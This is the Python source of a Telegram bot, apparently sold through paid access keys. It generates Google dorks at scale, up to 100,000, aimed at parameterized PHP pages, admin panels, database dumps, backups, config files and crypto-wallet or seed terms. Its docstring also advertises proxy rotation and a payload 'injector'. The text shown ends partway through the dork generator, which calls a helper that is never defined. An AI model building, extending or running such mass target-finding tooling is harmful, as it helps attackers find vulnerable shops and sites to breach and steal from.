#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🐍 PYTHON SNAKE CORE — v1.0
===========================
Sirf kaam ka bot. Koi faaltu cheez nahi.

TOOLS
-----
  🔍 PARSER      — real search engines se URLs nikaalo (proxy rotate)
  🎯 DORKER      — 67k+ dorks, page-type / extension / parameter / custom
  🔑 HQ KEYWORDS — high quality keyword generator (real scoring)
  🔗 URL REVERSE — URL toda → domain / path / ext / params + dorks
  💉 INJECTOR    — dork × param payload → target URL list
  📦 DUMPER      — sab results file/zip me export
  🧅 PROXY       — 45 sources + DoH bypass + very fast checker
  📊 QUALITY     — dork/keyword ko 0-100 score + wajah
  🎲 RANDOMIZER  — random combos + operator mutation
  👑 ADMIN       — poora control panel

Run:  python3 snake_core.py
"""

import os
import re
import sys
import json
import signal
import platform
import time
import math
import random
import asyncio
import hashlib
import logging
import zipfile
import html as _html
import string
from datetime import datetime, timedelta
from collections import OrderedDict, defaultdict
from urllib.parse import urlparse, parse_qs, unquote, quote_plus

try:
    import aiohttp
except ImportError:
    sys.exit("aiohttp missing → pip install aiohttp")

try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
    from telegram.constants import ParseMode
    from telegram.ext import (
        Application, ApplicationBuilder, CommandHandler, CallbackQueryHandler,
        MessageHandler, ContextTypes, filters,
    )
except ImportError:
    sys.exit("python-telegram-bot missing → pip install python-telegram-bot")


# ═══════════════════════════════════════════════════════════════════════════════
#  CONFIG  (./setconfig.sh se badlo — repo me placeholder hi rehta hai)
# ═══════════════════════════════════════════════════════════════════════════════
BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
ADMIN_IDS = [8999053405]
ADMIN_USERNAME = "@Bloody_sweet_baby"
BRAND = "PYTHON SNAKE"
VERSION = "v1.8"
KEY_RE = re.compile(r"^SNK-[A-Z0-9]{4}-[A-Z0-9]{4}$")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "data")
DUMP_DIR = os.path.join(BASE_DIR, "dumps")
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(DUMP_DIR, exist_ok=True)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)
logger = logging.getLogger("snake")

START_TS = time.time()

TOKEN = BOT_TOKEN
if (not TOKEN) or ("PUT_YOUR_BOT_TOKEN_HERE" in str(TOKEN)) or (":" not in str(TOKEN)):
    if __name__ == "__main__":
        print("\n" + "=" * 62)
        print("  ❌ BOT TOKEN SET NAHI HAI")
        print("=" * 62)
        print("  Token daalo (BotFather se):\n")
        print("      ./setconfig.sh\n")
        print("  ya seedha:\n")
        print("      ./settoken.sh 123456789:AAxxxxxxxxxxxxxxxxxxxxxxx\n")
        print("  Phir:  ./restart.sh")
        print("=" * 62 + "\n")
        raise SystemExit(2)


# ═══════════════════════════════════════════════════════════════════════════════
#  STORAGE — chhoti JSON files, atomic write
# ═══════════════════════════════════════════════════════════════════════════════
_LOCK = asyncio.Lock()


def _path(name: str) -> str:
    return os.path.join(DATA_DIR, name + ".json")


def jload(name: str, default=None):
    try:
        with open(_path(name), encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return default if default is not None else {}


def jsave(name: str, obj) -> bool:
    try:
        tmp = _path(name) + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(obj, f, ensure_ascii=False, indent=1)
        os.replace(tmp, _path(name))
        return True
    except Exception as exc:
        logger.warning("save %s fail: %s", name, exc)
        return False


# ── FRESH system — pehle bane dorks yaad rakho (repeat na ho) ────────────────
SEEN_FILE = os.path.join(DATA_DIR, "dork_seen.txt")
_SEEN = None
_SEEN_LIMIT = 400000


def dork_hash(x) -> str:
    return hashlib.sha1(" ".join(str(x or "").lower().split()).encode("utf-8", "ignore")).hexdigest()[:12]


def dork_seen() -> set:
    """Pehle generate hue dorks ke hashes (memory cache)."""
    global _SEEN
    if _SEEN is None:
        try:
            with open(SEEN_FILE, encoding="utf-8", errors="ignore") as f:
                _SEEN = {ln.strip() for ln in f if ln.strip()}
        except Exception:
            _SEEN = set()
    return _SEEN


def dork_seen_count() -> int:
    return len(dork_seen())


def dork_seen_add(dorks) -> int:
    """Naye dorks history me daalo. Returns kitne naye the."""
    seen = dork_seen()
    new = []
    for d in dorks or []:
        h = dork_hash(d)
        if h and h not in seen:
            seen.add(h)
            new.append(h)
    if not new:
        return 0
    try:
        with open(SEEN_FILE, "a", encoding="utf-8") as f:
            f.write("\n".join(new) + "\n")
    except Exception:
        return 0
    if len(seen) > _SEEN_LIMIT:
        dork_seen_trim()
    return len(new)


def dork_seen_trim(keep: int = None) -> int:
    """File bahut badi ho gayi to purane half hata do."""
    global _SEEN
    keep = int(keep or (_SEEN_LIMIT // 2))
    try:
        with open(SEEN_FILE, encoding="utf-8", errors="ignore") as f:
            lines = [ln.strip() for ln in f if ln.strip()]
    except Exception:
        return 0
    if len(lines) <= keep:
        return 0
    lines = lines[-keep:]
    try:
        with open(SEEN_FILE, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")
    except Exception:
        return 0
    _SEEN = set(lines)
    return len(lines)


def dork_seen_clear() -> int:
    global _SEEN
    n = len(dork_seen())
    try:
        open(SEEN_FILE, "w").close()
    except Exception:
        pass
    _SEEN = set()
    return n


USERS = jload("users", {})          # uid -> {name, joined, banned, runs}
KEYS = jload("keys", {})            # key -> {days, used_by, used_at, created}
SETTINGS = jload("settings", {})    # admin-tunable runtime settings


def save_all() -> None:
    jsave("users", USERS)
    jsave("keys", KEYS)
    jsave("settings", SETTINGS)


def sget(key: str, default=None):
    return SETTINGS.get(key, default)


def sset(key: str, value) -> None:
    SETTINGS[key] = value
    jsave("settings", SETTINGS)


def is_admin(uid) -> bool:
    try:
        return int(uid) in [int(x) for x in ADMIN_IDS]
    except Exception:
        return False


def has_access(uid) -> bool:
    uid = str(uid)
    if is_admin(uid):
        return True
    u = USERS.get(uid) or {}
    if u.get("banned"):
        return False
    exp = u.get("expires")
    if not exp:
        return False
    try:
        return datetime.fromisoformat(exp) > datetime.now()
    except Exception:
        return False


def touch_user(update) -> dict:
    u = update.effective_user
    uid = str(u.id)
    rec = USERS.get(uid) or {}
    if not rec:
        rec = {"joined": datetime.now().isoformat(timespec="seconds"), "runs": 0}
    rec["name"] = (u.username and ("@" + u.username)) or u.first_name or "?"
    rec["last"] = datetime.now().isoformat(timespec="seconds")
    USERS[uid] = rec
    jsave("users", USERS)
    return rec


# ═══════════════════════════════════════════════════════════════════════════════
#  SMALL UTILS
# ═══════════════════════════════════════════════════════════════════════════════
def fmt(n) -> str:
    try:
        return format(int(n), ",")
    except Exception:
        return str(n)


def bar(pct: float, width: int = 12) -> str:
    pct = max(0.0, min(100.0, float(pct)))
    filled = int(round(pct / 100 * width))
    return "█" * filled + "░" * (width - filled)


def short_list(items, n=12) -> str:
    items = list(items)
    out = items[:n]
    return "\n".join("• <code>%s</code>" % _html.escape(str(x)) for x in out) or "—"


def stamp() -> str:
    return datetime.now().strftime("%Y%m%d_%H%M%S")


def esc(x) -> str:
    return _html.escape(str(x), quote=False)


def chunk_lines(text: str, limit: int = 3900):
    """Bade text ko Telegram-safe chunks me todo."""
    out, cur = [], []
    size = 0
    for line in text.split("\n"):
        if size + len(line) + 1 > limit and cur:
            out.append("\n".join(cur))
            cur, size = [], 0
        cur.append(line)
        size += len(line) + 1
    if cur:
        out.append("\n".join(cur))
    return out


# (H() theme engine me define hota hai — neeche)


# ═══════════════════════════════════════════════════════════════════════════════
#  🎨 THEME ENGINE — unicode fonts, dividers, icons
# ═══════════════════════════════════════════════════════════════════════════════
import unicodedata as _ud


def _font_map(caps=None, low=None, digs=None, exc=None) -> dict:
    """Unicode math range -> dict. Hole (unassigned) codepoint = original char."""
    d = {}
    if caps:
        for i, ch in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
            d[ch] = chr(ord(caps) + i)
    if low:
        for i, ch in enumerate("abcdefghijklmnopqrstuvwxyz"):
            d[ch] = chr(ord(low) + i)
    if digs:
        for i in range(10):
            d[str(i)] = chr(ord(digs) + i)
    if exc:
        d.update(exc)
    for k, v in list(d.items()):
        try:
            if _ud.category(v) in ("Cn", "Cs", "Co"):
                d[k] = k
        except Exception:
            d[k] = k
    return d


_SMALL = dict(zip(
    "abcdefghijklmnopqrstuvwxyz",
    "ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀꜱᴛᴜᴠᴡxʏᴢ"))
_SMALL.update({k.upper(): v for k, v in list(_SMALL.items()) if k.isalpha() and v != k})
_SMALL["X"] = "x"   # small-cap X exist nahi karta — consistency ke liye lowercase

_CIRCLE = {}
for _i, _ch in enumerate("abcdefghijklmnopqrstuvwxyz"):
    _CIRCLE[_ch] = chr(0x24D0 + _i)
    _CIRCLE[_ch.upper()] = chr(0x24B6 + _i)
for _i in range(10):
    _CIRCLE[str(_i)] = chr(0x2460 + _i)

FONTS = {
    "plain":       {},
    "bold":        _font_map("\U0001D400", "\U0001D41A", "\U0001D7CE"),
    "italic":      _font_map("\U0001D434", "\U0001D44E", None, {"h": "\u210E"}),
    "bi":          _font_map("\U0001D468", "\U0001D482"),
    "script":      _font_map("\U0001D49C", "\U0001D4B6", None, {
                       "B": "\u212C", "E": "\u2130", "F": "\u2131", "H": "\u210B",
                       "I": "\u2110", "L": "\u2112", "M": "\u2133", "R": "\u211B",
                       "e": "\u212F", "g": "\u210A", "o": "\u2134"}),
    "bold_script": _font_map("\U0001D4D0", "\U0001D4EA"),
    "fraktur":     _font_map("\U0001D504", "\U0001D51E", None, {
                       "C": "\u212D", "H": "\u210C", "I": "\u2111",
                       "R": "\u211C", "Z": "\u2128"}),
    "double":      _font_map("\U0001D538", "\U0001D552", "\U0001D7D8", {
                       "C": "\u2102", "H": "\u210D", "N": "\u2115", "P": "\u2119",
                       "Q": "\u211A", "R": "\u211D", "Z": "\u2124"}),
    "sans":        _font_map("\U0001D5A0", "\U0001D5BA", "\U0001D7E2"),
    "sans_bold":   _font_map("\U0001D5D4", "\U0001D5EE", "\U0001D7EC"),
    "sans_italic": _font_map("\U0001D608", "\U0001D622"),
    "sans_bi":     _font_map("\U0001D63C", "\U0001D656"),
    "mono":        _font_map("\U0001D670", "\U0001D68A", "\U0001D7F6"),
    "wide":        _font_map("\uFF21", "\uFF41", "\uFF10"),
    "small":       _SMALL,
    "circle":      _CIRCLE,
}


def F(text, font: str = "plain") -> str:
    """Text ko diye font me badlo. Unknown chars waise hi rehte hain."""
    m = FONTS.get(font)
    if not m:
        return str(text)
    return "".join(m.get(c, c) for c in str(text))


# ── THEMES ───────────────────────────────────────────────────────────────────
# head = heading font • btn = button font • sub = subtitle font
# div = divider • icon = logo icon • tag = chhota accent
THEMES = OrderedDict([
    ("classic", {
        "label": "✿︎ CLASSIC", "head": "small", "btn": "small", "sub": "italic",
        "div": "✿︎━━━━━━━━━━━━━━━━━━━━━✿︎",
        "icon": "🐍", "tag": "✿︎",
    }),
    ("cursive", {
        "label": "❤︎ CURSIVE", "head": "bold_script", "btn": "script", "sub": "italic",
        "div": "❤︎﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌❤︎",
        "icon": "🌸", "tag": "❤︎",
    }),
    ("poppins", {
        "label": "﹌ POPPINS", "head": "sans_bold", "btn": "sans_bold", "sub": "sans_italic",
        "div": "﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌",
        "icon": "🐍", "tag": "﹌",
    }),
    ("italic", {
        "label": "಄ ITALIC", "head": "bi", "btn": "bi", "sub": "italic",
        "div": "಄───────────────────಄",
        "icon": "✦", "tag": "಄",
    }),
    ("royal", {
        "label": "♛ ROYAL", "head": "fraktur", "btn": "double", "sub": "italic",
        "div": "♛﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌♛",
        "icon": "♛", "tag": "✦",
    }),
    ("roboto", {
        "label": "◆ ROBOTO", "head": "sans", "btn": "sans", "sub": "sans_italic",
        "div": "◆▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬◆",
        "icon": "◆", "tag": "▸",
    }),
    ("bold", {
        "label": "𝗕 BOLD", "head": "bold", "btn": "bold", "sub": "italic",
        "div": "❰❰❰❰❰❰❰❰❰❰❰❰❰❰❰❰❰❰❰❱",
        "icon": "🔥", "tag": "❰",
    }),
    ("mono", {
        "label": "▚ MONO", "head": "mono", "btn": "mono", "sub": "mono",
        "div": "▚▚▚▚▚▚▚▚▚▚▚▚▚▚▚▚▚▚▚▚",
        "icon": "▚", "tag": "▚",
    }),
])
DEFAULT_THEME = "classic"

_EMOJI_HEAD = re.compile(r"^([\U0001F000-\U0001FAFF\u2190-\u2BFF\u2600-\u27BF"
                         r"\uFF00-\uFFEF\u3000-\u303F\u0E00-\u0E7F\u0C80-\u0CFF"
                         r"\u0900-\u097F\s]+)")


def theme_name() -> str:
    """Abhi kaun sa theme chalu hai."""
    t = str(sget("theme") or DEFAULT_THEME)
    return t if t in THEMES else DEFAULT_THEME


def T() -> dict:
    return THEMES[theme_name()]


def style(text: str, role: str = "btn") -> str:
    """Emoji/icon ko chhod ke sirf text ko theme font me badlo."""
    s2 = str(text or "")
    if not s2:
        return s2
    m = _EMOJI_HEAD.match(s2)
    pre = m.group(1) if m else ""
    rest = s2[len(pre):]
    if not rest:
        return s2
    font = T().get(role) or "plain"
    return pre + F(rest, font)


def H(title: str, sub: str = "") -> str:
    """Theme header — divider + icon + heading font."""
    th = T()
    d = th["div"]
    body = "%s %s" % (th["icon"], F(title, th["head"]))
    if sub:
        body += "\n%s" % F(sub, th["sub"])
    return "%s\n%s\n%s" % (d, body, d)


def tag(text: str = "") -> str:
    """Chhota accent — body me headings ke liye."""
    th = T()
    t = F(text, th["head"]) if text else ""
    return ("%s %s %s" % (th["tag"], t, th["tag"])).strip()


def RK(rows, **kw):
    """InlineKeyboardMarkup + har button label pe theme font."""
    out = []
    for row in (rows or []):
        nr = []
        for b in row:
            try:
                label = style(b.text, "btn")
                data = getattr(b, "callback_data", None)
                url = getattr(b, "url", None)
                if data:
                    nr.append(InlineKeyboardButton(label[:64], callback_data=data))
                elif url:
                    nr.append(InlineKeyboardButton(label[:64], url=url))
                else:
                    nr.append(b)
            except Exception:
                nr.append(b)
        if nr:
            out.append(nr)
    return InlineKeyboardMarkup(out, **kw)


# ═══════════════════════════════════════════════════════════════════════════════
#  DATA — dorking ke buniyadi tukde
# ═══════════════════════════════════════════════════════════════════════════════
PAGE_FILES = [
    "product.php", "product_detail.php", "product-detail.php", "productdetails.php",
    "item.php", "item_detail.php", "itemdetail.php", "item-details.php",
    "details.php", "detail.php", "product.php?id=", "item.php?id=",
    "shop.php", "store.php", "cart.php", "checkout.php", "order.php", "orders.php",
    "category.php", "categories.php", "listing.php", "catalog.php", "catalogue.php",
    "view.php", "viewitem.php", "show.php", "display.php", "read.php", "post.php",
    "article.php", "news.php", "blog.php", "page.php", "index.php", "main.php",
    "content.php", "download.php", "file.php", "get.php", "fetch.php", "api.php",
    "search.php", "results.php", "query.php", "login.php", "signin.php", "register.php",
    "signup.php", "profile.php", "user.php", "users.php", "account.php", "admin.php",
    "dashboard.php", "panel.php", "config.php", "settings.php", "upload.php", "image.php",
    "gallery.php", "photo.php", "video.php", "play.php", "stream.php", "redirect.php",
    "link.php", "goto.php", "out.php", "track.php", "invoice.php", "receipt.php",
    "report.php", "export.php", "print.php", "pdf.php", "xml.php", "json.php",
]

PAGE_DIRS = [
    "", "shop/", "store/", "products/", "product/", "item/", "items/", "catalog/",
    "category/", "categories/", "admin/", "administrator/", "panel/", "cp/", "dashboard/",
    "user/", "users/", "member/", "members/", "account/", "accounts/", "profile/",
    "api/", "api/v1/", "api/v2/", "v1/", "v2/", "v3/", "web/", "app/", "public/",
    "includes/", "include/", "inc/", "lib/", "src/", "core/", "system/", "modules/",
    "components/", "pages/", "page/", "content/", "data/", "files/", "upload/",
    "uploads/", "media/", "images/", "img/", "assets/", "static/", "tmp/", "temp/",
    "backup/", "backups/", "old/", "new/", "test/", "dev/", "staging/", "prod/",
]

EXTENSIONS = [
    "php", "php3", "php4", "php5", "phtml", "phps", "asp", "aspx", "ashx", "asmx",
    "jsp", "jspx", "do", "action", "cfm", "cfml", "cgi", "pl", "py", "rb", "go",
    "html", "htm", "xhtml", "shtml", "xml", "json", "js", "css", "txt", "log",
    "sql", "db", "sqlite", "mdb", "bak", "backup", "old", "orig", "save", "swp",
    "zip", "rar", "7z", "tar", "gz", "bz2", "env", "ini", "conf", "cfg", "yml",
    "yaml", "toml", "lock", "pdf", "doc", "docx", "xls", "xlsx", "csv", "odt",
]

PARAMS_BASE = [
    "id", "pid", "cid", "uid", "sid", "tid", "nid", "aid", "bid", "gid", "did", "fid",
    "cat", "catid", "cat_id", "category", "category_id", "item", "itemid", "item_id",
    "product", "productid", "product_id", "prod", "prodid", "sku", "code", "ref",
    "page", "pageid", "page_id", "p", "pg", "view", "viewid", "num", "no", "n",
    "user", "username", "userid", "user_id", "login", "email", "mail", "name",
    "order", "orderid", "order_id", "invoice", "invoiceid", "receipt", "txn", "transaction",
    "doc", "docid", "document", "file", "filename", "file_id", "path", "dir", "folder",
    "url", "link", "redirect", "return", "next", "goto", "target", "dest", "destination",
    "search", "q", "query", "s", "keyword", "keywords", "term", "terms", "find",
    "type", "sort", "order_by", "orderby", "filter", "lang", "language", "locale",
    "action", "do", "task", "op", "cmd", "command", "mode", "method", "func", "function",
    "module", "mod", "page_name", "section", "sec", "tab", "step", "stage", "state",
    "download", "dl", "get", "fetch", "load", "read", "readfile", "open", "include",
    "template", "tpl", "theme", "skin", "layout", "style", "css", "js",
    "admin", "panel", "config", "setting", "settings", "option", "options",
    "token", "key", "apikey", "api_key", "secret", "auth", "session", "sess",
    "date", "from", "to", "start", "end", "year", "month", "day", "limit", "offset",
    "count", "size", "len", "width", "height", "format", "output", "result", "status",
]

TLDS = [
    "com", "net", "org", "in", "co.uk", "io", "co", "de", "fr", "it", "es", "nl",
    "ru", "br", "mx", "ar", "pl", "se", "no", "dk", "fi", "ch", "at", "be", "pt",
    "gr", "tr", "pk", "bd", "lk", "np", "id", "my", "ph", "th", "vn", "sg", "hk",
    "kr", "jp", "cn", "tw", "au", "nz", "ca", "us", "za", "ng", "ke", "eg",
    "sa", "ae", "il", "ir", "ua", "cz", "ro", "hu", "bg", "hr", "sk", "lt", "lv",
    "ee", "si", "shop", "store", "site", "online", "xyz", "top", "club", "live",
]

NICHES = {
    "ecommerce": ["shop", "store", "cart", "checkout", "product", "price", "buy", "order"],
    "accounts": ["login", "signin", "signup", "register", "account", "profile", "password"],
    "admin": ["admin", "panel", "dashboard", "cpanel", "manage", "control", "console"],
    "files": ["download", "upload", "file", "document", "backup", "export", "dump"],
    "news": ["news", "article", "blog", "post", "story", "press", "report"],
    "crypto": ["wallet", "ledger", "seed", "private", "keystore", "metamask"],
    "api": ["api", "endpoint", "swagger", "graphql", "rest", "token", "key"],
    "db": ["database", "sql", "mysql", "phpmyadmin", "dump", "backup", "schema"],
}

KW_PRE = ["best", "cheap", "top", "new", "pro", "free", "premium", "buy", "get",
          "download", "online", "fast", "safe", "trusted", "verified", "instant",
          "unlimited", "private", "secure", "real", "legit", "working", "fresh",
          "latest", "official", "custom", "advanced", "simple", "easy", "full"]

KW_SUF = ["online", "shop", "store", "site", "hub", "zone", "world", "point",
          "plus", "pro", "max", "lab", "works", "base", "central", "market",
          "planet", "express", "direct", "deal", "deals", "offer", "offers",
          "sale", "review", "reviews", "guide", "tips", "list", "lists",
          "finder", "portal", "cloud", "app"]

KW_INTENT = ["price", "cost", "buy", "download", "free", "app", "apk", "login",
             "signup", "account", "service", "provider", "company", "near me",
             "review", "alternative", "how to", "guide", "tutorial", "tool",
             "software", "script", "api", "documentation", "template", "demo",
             "trial", "pricing"]

KW_TAIL = ["for beginners", "for business", "for sale", "for free", "near me",
           "in india", "in usa", "in uk", "online free", "free download",
           "full version", "latest version", "source code", "with source code",
           "script download", "template free", "wordpress plugin", "laravel",
           "django", "node js", "react", "python script", "php script",
           "api docs", "pdf download", "excel sheet", "csv file", "json api",
           "sql database", "admin panel", "login page", "dashboard",
           "control panel", "user manual", "setup guide", "configuration",
           "backup", "database dump", "export csv", "import data", "reports",
           "analytics", "invoice", "payment gateway", "checkout page",
           "shopping cart", "order tracking", "inventory system", "crm",
           "erp", "saas", "demo download", "pricing plans", "features list",
           "comparison", "alternatives list", "top 10", "directory list",
           "user complaints", "scam or legit", "trusted site", "best deal",
           "discount code", "coupon code", "free trial", "software download",
           "apk download", "mobile app", "desktop app", "web app",
           "chrome extension", "api key", "developer docs", "support page",
           "help center", "knowledge base"]

KW_YEARS = ["2026", "2027"]
KW_MAX = 100000
DORK_MAX = 100000

KW_BAD = {"", "a", "an", "the", "of", "in", "on", "at", "to", "for", "and", "or",
          "is", "are", "was", "be", "it", "this", "that", "with", "from", "by"}

DORK_TEMPLATES = [
    'inurl:{f} {p}= ext:{e}',
    'inurl:"{p}="',
    'inurl:{f}?{p}=',
    'allinurl:"{f}?{p}="',
    'inurl:{d}{f}?{p}=',
    '"{f}?{p}=" -site:github.com',
    'intext:"{p}=" inurl:{e}',
    'intitle:"{k}" inurl:{e}',
    'site:{t} inurl:{f}',
    'filetype:{e} inurl:{k}',
    'inurl:{f} intext:{k}',
    '"{f}" "{p}=" {t}',
]

_SRC = ""


def _uniq(seq):
    seen, out = set(), []
    for x in seq:
        if x not in seen:
            seen.add(x)
            out.append(x)
    return out


PARAM_SHAPES = ["", "?id=", "?pid=", "?page=", "?cat=", "?item=", "?p=", "?view=",
                 "?catid=", "?product_id=", "?user=", "?file="]


def gen_page_types() -> list:
    """dir × file × query-shape — real count (45k+)."""
    out = []
    for d in PAGE_DIRS:
        for f in PAGE_FILES:
            for q in PARAM_SHAPES:
                out.append(d + f + q)
    return out


def gen_extensions() -> list:
    return list(EXTENSIONS)


def gen_params() -> list:
    """Base params + real-world variants (sirf sensible ones)."""
    out = []
    for p in PARAMS_BASE:
        p = str(p).strip()
        if not p or p.endswith("_id") or p.endswith("id"):
            out.append(p)
            out.append(p + "[]")
            continue
        out.append(p)
        out.append(p + "_id")
        out.append(p + "id")
        out.append(p + "[]")
    # junk shapes hatao: x_id_id=, xxidid=, x__id=
    bad = re.compile(r"(_id_id|idid|__|\[\]\[\])$", re.I)
    return _uniq([x for x in out if x and not bad.search(x)])


def db_counts() -> dict:
    pts = gen_page_types()
    prs = gen_params()
    exts = gen_extensions()
    # dork space = templates × (page-types × params) capped realistically
    combo = len(pts) * len(prs)
    dork_space = len(DORK_TEMPLATES) * len(prs) * len(exts)
    return {
        "page_types": len(pts),
        "keywords": len(KW_PRE) * len(KW_SUF) * len(KW_INTENT),
        "extensions": len(exts),
        "parameters": len(prs),
        "dorks": combo + dork_space,
        "tlds": len(TLDS),
    }


# ═══════════════════════════════════════════════════════════════════════════════
#  DORK ENGINE
# ═══════════════════════════════════════════════════════════════════════════════
QUALITY_BAD = {
    "allinurl:", "allintitle:", "allintext:", "inanchor:", "cache:", "link:",
    "info:", "related:", "define:", "stocks:", "movie:",
}
BROAD_WORDS = {"www", "com", "net", "org", "index", "home", "main", "page", "html"}


def score_dork(dork: str) -> tuple:
    """0-100 quality score + reasons. Real logic, koi random nahi."""
    d = (dork or "").strip()
    if not d:
        return 0, ["khaali"]
    reasons, score = [], 50

    ops = []
    for op in ("site:", "inurl:", "intitle:", "intext:", "filetype:", "ext:"):
        if op in d.lower():
            ops.append(op.rstrip(":"))
    if ops:
        score += min(30, 10 * len(ops))
        reasons.append("+%d operator (%s)" % (min(30, 10 * len(ops)), ",".join(ops)))
    else:
        score -= 15
        reasons.append("-15 koi operator nahi")

    n = len(d)
    if 20 <= n <= 100:
        score += 8
        reasons.append("+8 length theek (%d)" % n)
    elif n > 160:
        score -= 20
        reasons.append("-20 bahut lamba (%d)" % n)
    elif n < 12:
        score -= 12
        reasons.append("-12 bahut chhota")

    if re.search(r'\binurl:[a-z_]+\=', d, re.I):
        score += 8
        reasons.append("+8 param wala inurl")
    if re.search(r'filetype:\(?\w+', d, re.I) or re.search(r'ext:\w+', d, re.I):
        score += 5
        reasons.append("+5 filetype")
    if d.count('"') % 2:
        score -= 12
        reasons.append("-12 quote band nahi hua")
    if re.search(r'\b(site|inurl|intitle|intext)\s*:\s*(\s|$)', d, re.I):
        score -= 15
        reasons.append("-15 operator khaali")
    low = d.lower()
    for b in QUALITY_BAD:
        if b in low:
            score -= 10
            reasons.append("-10 deprecated operator %s" % b)
    words = re.findall(r"[a-z0-9]+", low)
    if words and all(w in BROAD_WORDS for w in words):
        score -= 20
        reasons.append("-20 sirf broad words")
    if len(set(words)) < max(1, len(words) // 3):
        score -= 8
        reasons.append("-8 repeat zyada")
    if re.search(r'[^\x00-\x7f]', d):
        score -= 6
        reasons.append("-6 non-ascii")

    return max(0, min(100, score)), reasons


def quality_label(score: int) -> str:
    if score >= 80:
        return "🔥 EXCELLENT"
    if score >= 65:
        return "✅ GOOD"
    if score >= 45:
        return "🟡 AVERAGE"
    if score >= 25:
        return "🟠 WEAK"
    return "🔴 TRASH"


_PAGE_TYPES_CACHE = None
NICHE_WORDS = ["admin", "login", "dashboard", "panel", "backup", "config", "upload",
               "download", "invoice", "order", "product", "category", "search",
               "profile", "account", "settings", "api", "database", "report",
               "payment", "checkout", "cart", "user", "admin.php", "index.php"]


def _all_niche_words() -> list:
    out = []
    for vs in NICHES.values():
        out.extend(vs)
    return _uniq(out) or list(NICHE_WORDS)


def make_dork(mode: str = "mixed", n: int = 50, niche: str = "", tld: str = "",
              domain: str = "", exclude=None, fresh: bool = False) -> list:
    """Dork generator v2 — 100000 tak, fresh mode (purane dorks skip).

    mode: page | ext | param | inurl | site | niche | mixed
    """
    n = max(1, min(DORK_MAX, int(n or 50)))
    prs = gen_params()
    exts = list(EXTENSIONS)
    words = NICHE_WORDS
    ex = set(exclude or ())
    if fresh:
        ex |= dork_seen()
    out, seen = [], set(ex)

    def add(x):
        x = " ".join(str(x).split())
        if not x or len(x) > 200 or x in seen:
            return False
        if ex and dork_hash(x) in ex:
            return False
        seen.add(x)
        out.append(x)
        return True

    def full():
        return len(out) >= n

    mode = (mode or "mixed").lower()
    doms = [d.strip().lstrip(".").lower()
            for d in re.split(r"[,\s]+", str(domain or "")) if d.strip()]
    if tld and not doms:
        doms = [tld.strip().lstrip(".").lower()]

    # ── PAGE-TYPES ────────────────────────────────────────────────────────────
    if mode == "page":
        for d in PAGE_DIRS:
            for f in PAGE_FILES:
                add("inurl:%s%s" % (d, f))
                if full():
                    return _dork_finish(out, n)
        for d in PAGE_DIRS:
            for f in PAGE_FILES:
                add('inurl:"%s%s"' % (d, f))
                add("allinurl:%s%s" % (d, f))
                if full():
                    return _dork_finish(out, n)
        for d in PAGE_DIRS:
            for f in PAGE_FILES:
                for p in prs[:40]:
                    add("inurl:%s%s?%s=" % (d, f, p))
                    if full():
                        return _dork_finish(out, n)

    # ── EXTENSIONS ────────────────────────────────────────────────────────────
    elif mode == "ext":
        for e in exts:
            add("filetype:%s" % e)
            add("ext:%s" % e)
        for e in exts:
            for p in prs:
                add("filetype:%s inurl:%s=" % (e, p))
                if full():
                    return _dork_finish(out, n)
        for e in exts:
            for f in PAGE_FILES:
                for d in PAGE_DIRS[:24]:
                    add("filetype:%s inurl:%s%s" % (e, d, f))
                    if full():
                        return _dork_finish(out, n)

    # ── PARAMETERS ────────────────────────────────────────────────────────────
    elif mode == "param":
        for p in prs:
            add("inurl:%s=" % p)
            add('inurl:"%s="' % p)
        for p in prs:
            for f in PAGE_FILES:
                add("inurl:%s?%s=" % (f, p))
                if full():
                    return _dork_finish(out, n)
        for p in prs:
            for d in PAGE_DIRS[:30]:
                for f in PAGE_FILES[:20]:
                    add("inurl:%s%s?%s=" % (d, f, p))
                    if full():
                        return _dork_finish(out, n)

    # ── INURL (naya) ──────────────────────────────────────────────────────────
    elif mode == "inurl":
        for f in PAGE_FILES:
            add("inurl:%s" % f)
            add('inurl:"%s"' % f)
            add("allinurl:%s" % f)
        for d in PAGE_DIRS:
            if not d:
                continue
            add("inurl:%s" % d.rstrip("/"))
            for f in PAGE_FILES[:60]:
                add("inurl:%s%s" % (d, f))
                if full():
                    return _dork_finish(out, n)
        for f in PAGE_FILES:
            for p in prs:
                add("inurl:%s?%s=" % (f, p))
                if full():
                    return _dork_finish(out, n)
        for d in PAGE_DIRS:
            for f in PAGE_FILES:
                for p in prs[:30]:
                    add("inurl:%s%s?%s=" % (d, f, p))
                    if full():
                        return _dork_finish(out, n)

    # ── SITE (naya) ───────────────────────────────────────────────────────────
    elif mode == "site":
        if not doms:
            doms = random.sample(TLDS, min(6, len(TLDS)))
        for dom in doms:
            for f in PAGE_FILES:
                add("site:%s inurl:%s" % (dom, f))
            for p in prs[:150]:
                add("site:%s inurl:%s=" % (dom, p))
            for e in exts:
                add("site:%s ext:%s" % (dom, e))
                add("site:%s filetype:%s" % (dom, e))
            for w in words:
                add("site:%s intitle:%s" % (dom, w))
                add("site:%s intext:%s" % (dom, w))
                if full():
                    return _dork_finish(out, n)
            for f in PAGE_FILES[:60]:
                for p in prs[:60]:
                    add("site:%s inurl:%s?%s=" % (dom, f, p))
                    if full():
                        return _dork_finish(out, n)
            for w in words:
                for p in prs[:60]:
                    add("site:%s intext:%s inurl:%s=" % (dom, w, p))
                    if full():
                        return _dork_finish(out, n)
